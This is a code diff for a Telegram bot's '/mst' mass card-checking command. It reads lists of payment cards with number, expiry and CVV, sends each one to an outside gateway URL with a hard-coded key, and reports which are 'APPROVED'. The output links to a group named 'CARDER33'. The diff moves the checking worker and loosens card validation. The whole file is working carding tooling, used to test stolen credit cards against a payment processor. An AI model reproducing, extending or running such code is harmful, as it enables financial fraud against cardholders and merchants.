@@ -1852,138 +1852,18 @@ async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-import time
-import asyncio
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
-
-# -------------------- Credits --------------------
-async def consume_credit(user_id: int) -> bool:
-    user_data = await get_user(user_id)
-    if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
-        return True
-    return False
-
-
-# -------------------- /mst Worker --------------------
-import aiohttp
-import asyncio
-import time
-from telegram.constants import ParseMode
-
-BULLET_GROUP_LINK = "https://t.me/CARDER33"
-
-async def mst_worker(status_msg, cards: list):
-    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-
-    # Start timing
-    start_time = time.time()
-
-    # Counters
-    total = len(cards)
-    approved = 0
-    declined = 0
-    errors = 0
-
-    # Card results accumulator
-    card_results = []
-
-    async with aiohttp.ClientSession() as session:
-        for idx, card in enumerate(cards, start=1):
-            try:
-                url = f"https://rockyy.onrender.com/gateway?gateway=st1&key=rockysoon&card={card}"
-                async with session.get(url) as resp:
-                    data = await resp.json()
-
-                status = data.get("status", "ERROR").upper()
-                response = data.get("response", "No response")
-
-                # Counters + emoji
-                if status == "APPROVED":
-                    approved += 1
-                    emoji = "✅"
-                elif status == "DECLINED":
-                    declined += 1
-                    emoji = "❌"
-                else:
-                    errors += 1
-                    emoji = "⚠️"
-
-                # Format single card result
-                card_block = (
-                    f"<code>{card}</code>\n"
-                    f"𝗦𝘁𝗮𝘁𝘂𝘀 ➵ {emoji} <i>{response}</i>\n"
-                    "──────── ⸙ ─────────"
-                )
-                card_results.append(card_block)
-
-                # Build updated text (header + processed cards so far)
-                elapsed = time.time() - start_time
-                header = (
-                    f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
-                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {idx}/{total}\n"
-                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
-                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
-                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
-                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
-                    "──────── ⸙ ─────────\n"
-                )
-
-                final_text = header + "\n".join(card_results)
-
-                await status_msg.edit_text(
-                    final_text,
-                    parse_mode=ParseMode.HTML,
-                    disable_web_page_preview=True,
-                )
-
-                await asyncio.sleep(1)
-
-            except Exception as e:
-                errors += 1
-                card_results.append(
-                    f"<code>{card}</code>\n𝗦𝘁𝗮𝘁𝘂𝘀 ➵ ⚠️ <i>{str(e)}</i>\n──────── ⸙ ─────────"
-                )
-
-    # Final update (lock in totals)
-    elapsed = time.time() - start_time
-    header = (
-        f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
-        f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {total}/{total}\n"
-        f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
-        f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
-        f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
-        f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
-        "──────── ⸙ ─────────\n"
-    )
-    final_text = header + "\n".join(card_results)
-
-    await status_msg.edit_text(
-        final_text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True,
-    )
-
-
-
 import re
 import time
 import asyncio
+import aiohttp
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-from db import get_user, update_user  # import your credit functions
+from db import get_user, update_user  # Your credit functions
 
 # -------------------- Cooldowns --------------------
 mst_cooldowns = {}
-
 BULLET_GROUP_LINK = "https://t.me/CARDER33"
-
-# Regex for valid card: 12-19 digits | MM(01-12) | YY(00-99) | CVV 3-4 digits
-CARD_PATTERN = re.compile(r"^\d{12,19}\|(0[1-9]|1[0-2])\|\d{2,4}\|\d{3,4}$")
 
 def mdv2_escape(text: str) -> str:
     escape_chars = r"_*[]()~`>#+-=|{}.!"
@@ -1997,10 +1877,89 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
+# -------------------- Worker --------------------
+async def mst_worker(status_msg, cards: list):
+    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
+    start_time = time.time()
+
+    total = len(cards)
+    approved = 0
+    declined = 0
+    errors = 0
+    card_results = []
+
+    async with aiohttp.ClientSession() as session:
+        for idx, card in enumerate(cards, start=1):
+            try:
+                url = f"https://rockyy.onrender.com/gateway?gateway=st1&key=rockysoon&card={card}"
+                async with session.get(url) as resp:
+                    data = await resp.json()
+
+                status = data.get("status", "ERROR").upper()
+                response = data.get("response", "No response")
+
+                if status == "APPROVED":
+                    approved += 1
+                    emoji = "✅"
+                elif status == "DECLINED":
+                    declined += 1
+                    emoji = "❌"
+                else:
+                    errors += 1
+                    emoji = "⚠️"
+
+                card_block = (
+                    f"<code>{card}</code>\n"
+                    f"𝗦𝘁𝗮𝘁𝘂s ➵ {emoji} <i>{response}</i>\n"
+                    "──────── ⸙ ─────────"
+                )
+                card_results.append(card_block)
+
+                elapsed = time.time() - start_time
+                header = (
+                    f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
+                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {idx}/{total}\n"
+                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
+                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
+                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
+                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
+                    "──────── ⸙ ─────────\n"
+                )
+                final_text = header + "\n".join(card_results)
+
+                await status_msg.edit_text(
+                    final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
+                )
+                await asyncio.sleep(1)
+
+            except Exception as e:
+                errors += 1
+                card_results.append(
+                    f"<code>{card}</code>\n𝗦𝘁𝗮𝘁𝗶𝗼𝗻 ➵ ⚠️ <i>{str(e)}</i>\n──────── ⸙ ─────────"
+                )
+
+    # Final update
+    elapsed = time.time() - start_time
+    header = (
+        f"{bullet_link} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲 1$\n"
+        f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {total}/{total}\n"
+        f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {approved}\n"
+        f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {declined}\n"
+        f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {errors}\n"
+        f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {elapsed:.2f} Sec\n"
+        "──────── ⸙ ─────────\n"
+    )
+    final_text = header + "\n".join(card_results)
+    await status_msg.edit_text(
+        final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
+    )
+
+
+# -------------------- /mst Command --------------------
 async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # Extract cards (from reply or args)
+    # Extract cards from reply or args
     if update.message.reply_to_message:
         card_text = update.message.reply_to_message.text
     else:
@@ -2009,18 +1968,14 @@ async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         card_text = " ".join(context.args)
 
-    # Filter only valid cards
-    cards = [
-        c.strip()
-        for c in card_text.splitlines()
-        if CARD_PATTERN.match(c.strip())
-    ]
+    # Any line with | is treated as a card
+    cards = [c.strip() for c in card_text.splitlines() if "|" in c]
 
     if not cards:
         await update.message.reply_text("⚠️ No valid cards found.")
         return
 
-    # ✅ Apply cooldown only if valid cards exist
+    # ✅ Apply cooldown only if cards exist
     now = time.time()
     if user_id in mst_cooldowns and now - mst_cooldowns[user_id] < 5:
         remaining = int(5 - (now - mst_cooldowns[user_id]))
